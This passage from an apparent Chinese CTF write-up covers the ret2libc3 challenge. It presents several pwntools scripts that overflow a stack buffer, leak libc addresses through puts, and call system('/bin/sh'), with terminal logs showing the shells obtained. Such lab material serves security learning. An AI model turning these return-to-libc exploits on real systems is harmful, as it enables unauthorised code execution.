<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(base): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(system_addr): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(bin_addr): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload2 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">,</span>bin_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment"># 使用p32函数将整数转换为对应的4字节二进制字符串</span>
<span class="token comment"># payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'0xdeadbeaf' + p32(sh_addr) # 错误写法</span>
<span class="token comment"># payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr) # 正确写法</span>
<span class="token comment"># payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'\x0f\x0b\x0f\x0b' + p32(sh_addr) # 正确写法</span>
<span class="token comment"># payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'1234' + p32(sh_addr) # 正确写法</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload2: "</span><span class="token punctuation">,</span> payload2<span class="token punctuation">)</span>
<span class="token comment"># 发送构建好的 payload2 到程序，触发第二阶段的漏洞利用，旨在获取系统 Shell。</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'!?'</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>
<span class="token comment"># 与程序进行交互，获取系统 Shell，进入交互式命令模式。</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

                                                                                                                                                                       <span class="token triple-quoted-string string">"""                                                            
┌──(root㉿kali)-[~/ctfwiki/ret2libc3]
└─# python exp.py      
[+] Starting local process './ret2libc3': pid 18449
[*] '/root/ctfwiki/ret2libc3/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
=== 通过泄露 puts 函数的地址 ===
puts_plt:  134513760
hex(puts_plt):  0x8048460
puts_got:  134520856
hex(puts_got):  0x804a018
start_addr:  134513872
hex(start_addr):  0x80484d0
payload1:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`\x84\x04\x08\xd0\x84\x04\x08\x18\xa0\x04\x08'
/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
puts_addr_raw:  b' 2\xc7\xf7'
puts_addr:  4157026848
hex(puts_addr):  0xf7c73220
=== 计算libc的基址，然后获取 system 函数地址和 /bin/sh 字符串地址 ===
[+] There are multiple libc that meet current constraints :
0 - libc6_2.37-5_i386
1 - libc6_2.32-0experimental0_amd64
2 - libc6_2.37-6_i386
3 - libc6-amd64_2.32-0experimental0_i386
4 - libc6-amd64_2.8~20080505-0ubuntu9_i386
5 - libc6_2.32-0experimental1_amd64
6 - libc6-amd64_2.32-0experimental1_i386
7 - libc6_2.8~20080505-0ubuntu9_amd64
8 - libc6_2.37-7_i386
[+] Choose one : 0
hex(base):  0xf7c00000
hex(system_addr):  0xf7c4c8a0
hex(bin_addr):  0xf7db5fc8
payload2:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xc8\xc4\xf7\xd2\x04\x00\x00\xc8_\xdb\xf7'
[*] Switching to interactive mode
$ ls
core  exp2.py  exp-clean.py  exp.py  ret2libc3
$  
"""</span>
	
</code></pre> 
<p><img src="https://images2.imgbox.com/36/a2/VrEIArYU_o.png" alt="image.png"></p> 
<h4><a id="libcdatabase_916"></a>libc-database</h4> 
<p><a href="https://libc.rip/" rel="nofollow">https://libc.rip/</a></p> 
<p>从上面的运行结果中可以看到，puts函数的真实地址为：0xf7c73220<br> 末尾220为12位，输入工具中进行查找，可以看到右边的第一个就是我们上面输入的0所对应的<a href="https://libc.rip/#" rel="nofollow">libc6_2.37-5_i386</a></p> 
<p><img src="https://images2.imgbox.com/c6/4f/SGqEhTxX_o.png" alt="image.png"></p> 
<h3><a id="expclean___exp__926"></a>exp-clean exp 删掉了注释</h3> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2libc3"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2libc3"</span><span class="token punctuation">)</span>

puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
start <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_start'</span><span class="token punctuation">]</span>

<span class="token comment"># payload = b'A'*108 + b'BBBB' + puts_plt + start + puts_got  # 报错：TypeError: can't concat int to bytes</span>
payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">108</span> <span class="token operator">+</span> <span class="token string">b'BBBB'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>start<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token comment"># 正确写法</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Can you find it !?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
puts_addr_raw <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>puts_addr_raw<span class="token punctuation">)</span>

libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
sh_addr <span class="token operator">=</span> base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>

<span class="token comment"># payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'0xdeadbeaf' + p32(sh_addr) # 错误写法</span>
<span class="token comment"># payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr) # 正确写法</span>
<span class="token comment"># payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'\x0f\x0b\x0f\x0b' + p32(sh_addr) # 正确写法</span>
payload2 <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">108</span> <span class="token operator">+</span> <span class="token string">b'BBBB'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'1234'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token comment"># 正确写法</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Can you find it !?"</span><span class="token punctuation">,</span> payload2<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token triple-quoted-string string">"""
┌──(root㉿kali)-[~/ctfwiki/ret2libc3]
└─# python exp-clean.py                                                                              
[+] Starting local process './ret2libc3': pid 18209
[*] '/root/ctfwiki/ret2libc3/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[+] There are multiple libc that meet current constraints :
0 - libc6_2.37-5_i386
1 - libc6_2.32-0experimental0_amd64
2 - libc6_2.37-6_i386
3 - libc6-amd64_2.32-0experimental0_i386
4 - libc6-amd64_2.8~20080505-0ubuntu9_i386
5 - libc6_2.32-0experimental1_amd64
6 - libc6-amd64_2.32-0experimental1_i386
7 - libc6_2.8~20080505-0ubuntu9_amd64
8 - libc6_2.37-7_i386
[+] Choose one : 0
[*] Switching to interactive mode
$ ls
core  exp2.py  exp-clean.py  exp.py  ret2libc3
$ 
[*] Interrupted
[*] Stopped process './ret2libc3' (pid 18209)
                                                                                                                                                                                                                                          
┌──(root㉿kali)-[~/ctfwiki/ret2libc3]
└─# 
                                                                                                                                                                                                                                          
┌──(root㉿kali)-[~/ctfwiki/ret2libc3]
└─# 
       
"""</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/27/89/cvd3GL06_o.png" alt="image.png"></p> 
<h3><a id="exp2setvbuf_1000"></a>exp2：泄露setvbuf函数的真实地址</h3> 
<pre><code class="prism language-python"><span class="token comment"># 导入 pwntools 库，这是一个用于二进制漏洞利用的强大工具库。</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># 导入 LibcSearcher，这是一个用于从函数地址中搜索libc版本和提取libc函数地址的工具。</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span> 

<span class="token comment"># 创建一个新的进程，执行名为 ret2libc3 的可执行文件。这将用于在本地系统上执行漏洞利用。</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2libc3"</span><span class="token punctuation">)</span>
<span class="token comment"># 将 ret2libc3 可执行文件加载到 elf 对象中，以便从中获取有关程序结构的信息，例如函数地址和GOT地址。</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2libc3"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== 通过泄露 setvbuf 函数的地址 ==="</span><span class="token punctuation">)</span>
<span class="token comment"># 获取 puts 函数的 PLT（Procedure Linkage Table）地址和 GOT（Global Offset Table）地址。</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
setvbuf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"setvbuf"</span><span class="token punctuation">]</span>
<span class="token comment"># 获取程序的 _start 符号的地址，这通常是程序的入口点。</span>
start_addr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_start'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_plt: "</span><span class="token punctuation">,</span> puts_plt<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(puts_plt): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"setvbuf_got: "</span><span class="token punctuation">,</span> setvbuf_got<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(setvbuf_got): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>setvbuf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start_addr: "</span><span class="token punctuation">,</span> start_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(start_addr): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 构建一个 payload，其中包括 112 个字节的填充（用于填充到返回地址之前），然后是 puts 函数的 PLT 地址、程序入口点地址和 setvbuf 函数的 GOT 地址。这将在程序中触发漏洞。</span>
payload1 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>puts_plt<span class="token punctuation">,</span>start_addr<span class="token punctuation">,</span>setvbuf_got<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment"># payload1 = b'A'*108 + b'BBBB' + puts_plt + start + setvbuf_got  # 报错：TypeError: can't concat int to bytes</span>
<span class="token comment"># payload1 = b'A'*108 + b'BBBB' + p32(puts_plt) + p32(start) + p32(setvbuf_got) # 正确写法</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload1: "</span><span class="token punctuation">,</span> payload1<span class="token punctuation">)</span>
<span class="token comment"># 发送构建好的 payload1 到程序。</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'!?'</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>
<span class="token comment"># 接收从程序中泄露的 puts 函数的地址，并将其转换为整数。这将帮助确定libc的基址。</span>
<span class="token comment"># io.recv(4)接受程序返回的二进制 大小为4字节  u32()为保存为无符号的32位</span>
setvbuf_addr_raw <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
setvbuf_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>setvbuf_addr_raw<span class="token punctuation">)</span> 
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"setvbuf_addr_raw: "</span><span class="token punctuation">,</span> setvbuf_addr_raw<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"setvbuf_addr: "</span><span class="token punctuation">,</span> setvbuf_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(setvbuf_addr): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>setvbuf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== 计算libc的基址，然后获取 system 函数地址和 /bin/sh 字符串地址 ==="</span><span class="token punctuation">)</span>
<span class="token comment"># 使用 LibcSearcher 工具，根据泄露的 puts 函数地址来搜索libc库并提取相关信息。</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'setvbuf'</span><span class="token punctuation">,</span>setvbuf_addr<span class="token punctuation">)</span>
<span class="token comment"># 计算libc的基址，这是通过从 puts 函数地址中减去 puts 在libc中的偏移得到的。</span>
base <span class="token operator">=</span> setvbuf_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'setvbuf'</span><span class="token punctuation">)</span>
<span class="token comment"># 计算 system 函数和 /bin/sh 字符串的地址，这将用于后续的漏洞利用。</span>
system_addr <span class="token operator">=</span> base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
bin_addr<span class="token operator">=</span>base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
<span class="token comment"># 构建第二个 payload，其中包括 112 个字节的填充，然后是计算得到的 system 函数地址、随意的返回地址（1234），以及计算得到的 /bin/sh 字符串地址。</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(base): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(system_addr): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(bin_addr): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload2 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">,</span>bin_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment"># 使用p32函数将整数转换为对应的4字节二进制字符串</span>
<span class="token comment"># payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'0xdeadbeaf' + p32(sh_addr) # 错误写法</span>
<span class="token comment"># payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr) # 正确写法</span>
<span class="token comment"># payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'\x0f\x0b\x0f\x0b' + p32(sh_addr) # 正确写法</span>
<span class="token comment"># payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'1234' + p32(sh_addr) # 正确写法</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload2: "</span><span class="token punctuation">,</span> payload2<span class="token punctuation">)</span>
<span class="token comment"># 发送构建好的 payload2 到程序，触发第二阶段的漏洞利用，旨在获取系统 Shell。</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'!?'</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>
<span class="token comment"># 与程序进行交互，获取系统 Shell，进入交互式命令模式。</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""                                                            
┌──(root㉿kali)-[~/ctfwiki/ret2libc3]
└─# python exp2.py
[+] Starting local process './ret2libc3': pid 21841
[*] '/root/ctfwiki/ret2libc3/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
=== 通过泄露 setvbuf 函数的地址 ===
puts_plt:  134513760
hex(puts_plt):  0x8048460
setvbuf_got:  134520872
hex(setvbuf_got):  0x804a028
start_addr:  134513872
hex(start_addr):  0x80484d0
payload1:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`\x84\x04\x08\xd0\x84\x04\x08(\xa0\x04\x08'
/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
setvbuf_addr_raw:  b'\x80:\xc7\xf7'
setvbuf_addr:  4157028992
hex(setvbuf_addr):  0xf7c73a80
=== 计算libc的基址，然后获取 system 函数地址和 /bin/sh 字符串地址 ===
[+] There are multiple libc that meet current constraints :
0 - libc6-amd64_2.31-0ubuntu9.4_i386
1 - libc6_2.3.2.ds1-13ubuntu2.3_amd64
2 - libc6_2.37-5_i386
3 - libc-2.33.9000-40.fc35.i686
4 - libc6_2.11.1-0ubuntu7.14_i386
5 - libc-2.33.9000-42.fc35.i686
6 - libc6-amd64_2.31-0ubuntu9.5_i386
7 - libc6_2.3.2.ds1-13ubuntu2.2_amd64
8 - libc6_2.37-6_i386
9 - libc-2.33.9000-43.fc35.i686
[+] Choose one : 2
hex(base):  0xf7c00000
hex(system_addr):  0xf7c4c8a0
hex(bin_addr):  0xf7db5fc8
payload2:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xc8\xc4\xf7\xd2\x04\x00\x00\xc8_\xdb\xf7'
[*] Switching to interactive mode
$ ls
core  exp2.py  exp33.py  exp-clean.py  exp.py  ret2libc3
$  
"""</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/98/27/f100O0aF_o.png" alt="image.png"></p> 
<p>可以看到有很多个libc版本，可以1个1个的试(因为程序为32位的，所以可以选择性的把64位的去掉)<br> 另外一个办法就是查看libc-database，找到可用的libc，直接选择对应的libc序号即可</p> 
<p><img src="https://images2.imgbox.com/d5/cd/VrdyMghg_o.png" alt="image.png"></p> 
<h3><a id="exp3__libc_start_main_1120"></a>exp3：利用__libc_start_main泄露</h3> 
<p>官方的题解，没有跑出来</p> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token triple-quoted-string string">"""
基本利用思路如下：
1）泄露 __libc_start_main 地址
2）获取 libc 版本
3）获取 system 地址与 /bin/sh 的地址
4）再次执行源程序
5）触发栈溢出执行 system(‘/bin/sh’)

1）详细介绍：
a. 当你将puts函数的地址放在栈上，然后通过控制程序流使其执行puts函数，程序会跳转到puts函数的代码，开始执行它。而puts函数通常用于将一个以null结尾的字符串输出到标准输出（终端）。
b. 在这种情况下，你将__libc_start_main的GOT（Global Offset Table，全局偏移表）地址作为参数传递给了puts函数。这个GOT表是一个特殊的数据结构，包含了程序中需要调用的外部库函数的地址。其中，__libc_start_main函数在程序启动时被调用，因此GOT表中存储了对该函数的引用。
c. 当puts函数被执行时，它会根据传递的地址从GOT表中读取数据，然后将这些数据输出到终端。由于你传递的是__libc_start_main的GOT表地址，puts函数实际上会输出__libc_start_main函数的地址。

"""</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher

sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
ret2libc3 <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
<span class="token comment"># context(os="linux", log_level='debug')</span>

puts_plt <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
libc_start_main_plt <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
libc_start_main_got <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
main <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(puts_plt): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(libc_start_main_got): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(libc_start_main_plt): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_start_main_plt<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(main): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak libc_start_main_got addr and return to main again"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> puts_plt<span class="token punctuation">,</span> main<span class="token punctuation">,</span> libc_start_main_got<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment"># sh.sendlineafter('Can you find it !?', payload)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'!?'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get the related addr"</span><span class="token punctuation">)</span>
libc_start_main_addr_raw <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
libc_start_main_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>libc_start_main_addr_raw<span class="token punctuation">)</span> 
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_start_main_addr_raw: "</span><span class="token punctuation">,</span> libc_start_main_addr_raw<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_start_main_addr: "</span><span class="token punctuation">,</span> libc_start_main_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(libc_start_main_addr): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_start_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span> libc_start_main_addr<span class="token punctuation">)</span>
libcbase <span class="token operator">=</span> libc_start_main_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(libcbase): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(system_addr): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(binsh_addr): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get shell"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">104</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/0b/3c/yX51lAKI_o.png" alt="image.png"></p> 
<h3><a id="_1183"></a>参考</h3> 
